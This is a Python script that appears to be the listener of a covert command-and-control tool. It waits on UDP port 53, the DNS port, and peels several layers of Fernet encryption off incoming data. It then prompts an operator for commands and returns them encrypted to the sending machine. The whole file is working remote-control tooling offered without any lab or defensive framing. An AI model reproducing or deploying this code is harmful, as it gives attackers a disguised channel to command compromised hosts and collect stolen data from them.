import sys
import os
import socket
from cryptography.fernet import Fernet
import termcolor
keys = []
if not os.path.isfile('keys'):
  print("Keys file not found. Please generate one with \"key_generator.py\"")
  sys.exit(1)
for key in open("keys").readlines():
  keys.append(bytes(key.strip(), "utf-8"))

def encode(data):
  return bytes(data, "latin-1")

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
print(termcolor.colored("LISTENING ON PORT 53...", 'green'))
keys2 = keys
keys2.reverse()
while True:
 try:

   d = s.recvfrom(99999999)
   data = d[0]

   for key in keys2:
      key2 = key.decode()
      print(termcolor.colored('[CRYPT] DECRYPTING WITH KEY:' + key2, 'green'))
      key = Fernet(key)
      data = key.decrypt(data)

   print(termcolor.colored('[DATA_START]:\n\n' + data.decode(), 'green'))
   print(termcolor.colored('\n[DATA_STOP]', 'green'))
   print(termcolor.colored('[TRANSACTIONS] FETCHING DATA', 'green'))

   payload2 = input(termcolor.colored("Command:", "magenta"))
   payload = encode(payload2)

   for key in keys2:
      key2 = key.decode()
      print(termcolor.colored('[CRYPT] ENCRYPTING WITH KEY:' + key2, 'green'))
      key = Fernet(key)
      payload = key.encrypt(payload)

   s.sendto(payload, d[1])
   print(termcolor.colored('[TRANSACTIONS] DATA SENT:' + payload2, "green"))
   payload = encode(payload2)   
 except:
    print("ERROR!")
    payload2 = ""
    d = b""
